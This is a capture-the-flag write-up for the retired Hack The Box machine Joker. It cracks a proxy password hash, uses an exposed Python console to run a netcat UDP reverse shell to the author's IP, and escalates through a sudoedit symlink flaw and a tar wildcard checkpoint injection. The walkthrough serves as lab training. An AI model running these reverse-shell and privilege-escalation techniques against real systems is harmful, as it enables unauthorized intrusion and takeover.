# Joker

This is the write-up for the box Joker that got retired at the 22nd September 2017.
My IP address was 10.10.14.23 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.21    joker.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/joker.nmap 10.10.10.21
```

```markdown
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)
|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)
|_  256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap UDP scan:
```markdown
nmap -sU -o nmap/joker-udp.nmap 10.10.10.21
```

```markdown
PORT     STATE         SERVICE
69/udp   open|filtered tftp
5355/udp open|filtered llmnr
```

## Checking TFTP (Port 69)

On the UDP port scan there is port 69 filtered and described as TFTP.
We can connect to box via TFTP:
```markdown
tftp 10.10.10.21
```

This tool has no way to display the current directory or files, so we guess which files we could download by trying different files on a Linux system where we know that _Squid_ is installed and the configuration files are probably in _/etc/squid_:
```markdown
get /etc/squid
get /etc/squid/squid.conf
```

After downloading the configuration files of Squid, we can analyze them.
By filtering all the lines that are commented out, it is possible to read the configured settings:
```markdown
cat squid.conf | grep -v ^\# | grep .
```

This file tells us, that it uses the file _/etc/squid/passwords_ to authenticate which we can download, too.
In this file there is a username and a password hash:
> kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0

We use **Hashcat** to specify what type of hash by looking at the example which starts with _$apr1$_.
This hash is **Apache MD5 APR** and should be crackable:
```markdown
hashcat -m 1600 squid.hash /usr/share/wordlists/rockyou.txt
```

After a while the hash gets cracked and the password is:
> ihateseafood

## Checking Squid HTTP Proxy (Port 3128)

Browsing to the web page on port 3128 there is a generic error message from the _Squid_ application.
As this is a proxy, we will use it on our local machine to see if the connection to other services through this works.

After configuring the proxy settings in the browser and browsing to web page on port 80, it prompts us to input credentials for _kalamari_.

### Connecting to the Squid Proxy and enumerating the Web Page

Lets put the username and password that we got from TFTP in the Proxy configuration and browse to HTTP port 80 back again.
It doesn't prompt us for a password anymore and shows a different Squid error message.

If we browse to _127.0.0.1_, which is the local address of the proxy, there is a page:

![Web Page](https://kyuu-ji.github.io/htb-write-up/joker/joker_webpage.png)

To analyze web pages with **Burpsuite** over another Proxy we need to configure an **Upstream Proxy Server**:
```markdown
User options --> Connections --> Upstream Proxy Servers --> Add
```

![Burpsuite Upstream Proxy](https://kyuu-ji.github.io/htb-write-up/joker/joker_burpsuite-proxy.png)

The **Shorty** application is a rabbit hole and not vulnerable. The web page needs to get enumerated more by looking for hidden paths.
First we need to create another **Proxy Listener in Burpsuite**:
```markdown
Proxy --> Proxy Listeners --> Add
```
```markdown
Bind to port: 80
Bind to address: Loopback only
Redirect to host: 127.0.0.1
Redirect to port 80
```

Now other commands like _cURL_ go through Burpsuite and reach the box.
Lets look for hidden paths and PHP pages with **Gobuster**:
```markdown
gobuster -u http://127.0.0.1 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

This will find the following paths:
- /list (Status: 301)
  - Lists the shortened URLs by Shorty
  - No shortened URLs in there
- /console (Status: 200)
  - Interactive Python Console

The _/console_ page seems interesting:

![Web console](https://kyuu-ji.github.io/htb-write-up/joker/joker_console.png)

### Getting a reverse shell

Lets see what is possible with this Interactive Python Console.
Executing system commands works by importing the **os** module:
```markdown
import os
os.popen("whoami").read()

'werkzeug\n'
```

We are the user _werkzeug_ on this box and can try if a connection to my local machine with `ping` works because starting a reverse shell with **Netcat** did not:
```markdown
os.popen("ping -c 4 10.10.14.23 &").read()
```

The connection works, so lets read the **IPtables** configuration.
```markdown
os.popen("base64 -w 0 /etc/iptables/rules.v4").read()
```

Displaying the output as a _Base64_ string because the console doesn't do line breaks and its easier to read when converting the string.
```markdown
:INPUT DROP [41573:1829596]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [878:221932]
-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
-A INPUT -i ens33 -p udp -j ACCEPT
-A INPUT -i ens33 -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
COMMIT
```

Summarizing the rules:
- _DROP_ every _INPUT_, when it does not have a rule
- _ACCEPT_ _INPUT_ from port 22, 3128, UDP ports, ICMP

Only connections with UDP or ICMP can be started. Lets start **Netcat** with the UDP flag (-u) set.
```markdown
os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.14.23 9001 >/tmp/f &").read()
```

This works and the listener on our IP and UDP port 9001 starts the connection.

## Privilege Escalation to User

We are logged in as the user _werkzeug_ but in the _/home_ directory there is a user named _alekos_ to whom we want to escalate our privileges to.

Lets see the commands we can run as root:
```markdown
sudo -l

# Output
Matching Defaults entries for werkzeug on joker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    sudoedit_follow, !sudoedit_checkdir

User werkzeug may run the following commands on joker:
    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html
```

By looking for the version of `sudo` it shows that it is version **1.8.16**.
```markdown
dpkg -l sudo

# Output
ii  sudo        1.8.16-0ubun amd64
```

When checking for vulnerabilities with `searchsploit sudoedit`, there is the vulnerability **Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation** which seems to be for a lower version, but it still works on this box, because of the _sudoedit_follow_ flag.

The description of this says the following:
> It seems that sudoedit does not check the full path if a wildcard is used twice (e.g. /home/*/*/file.txt), allowing a malicious user to replace the file.txt real file with a symbolic link to a different location

The two wildcards are the same on the box as described here. So we create a directory in _/var/www/testing_ and then create a _Symbolic Link_ to _/home/alekos/.ssh/authorized_keys_ with the name _layout.html_.
```markdown
mkdir /var/www/testing/tester

ln -s _/home/alekos/.ssh/authorized_keys_ layout.html
```

After that we can use `sudoedit` to write to that file.
```markdown
sudoedit -u alekos /var/www/testing/tester layout.html
```

Generating a SSH key:
```markdown
ssh-keygen
```

This will create a **id_rsa** file which is the private key and **id_rsa.pub** which contents we will write into the the _authorized_keys_ file, so the box trusts the connection from our machine.
```markdown
ssh -i id_rsa alekos@10.10.10.21
```

Now we are logged in as _alekos_.

## Privilege Escalation to root

In the home directory of _alekos_ are the folders _/development_ and _/backup_. The backup folder has compressed files in it which are created in a 5 minute interval and are owned by root. They contain the files of the development folder.

We can create a symbolic link to the _/root_ folder, so it gets compressed the next time and we will have permissions to read the files in there.
```markdown
ln -s /root/ development
```

The next backup that will run, will write the contents of the _/root_ folder into the compressed file.
```markdown
tar -xvf dev-1573924201.tar.gz
```

To get a root shell we can abuse the `tar` command by giving it parameters with files.
Because the `tar` command compresses all files with the wildcard character, it will interpret these files as parameters and will execute them.
```markdown
touch -- --checkpoint=1
touch -- '--checkpoint-action=exec=sh shell.sh'
```

With these parameters, `tar` will execute binaries.
The script _shell.sh_ is the same reverse shell as used before but wants to connect on UDP port 9002.

The compression script will execute after 5 minutes and our listener will start a session as root!  
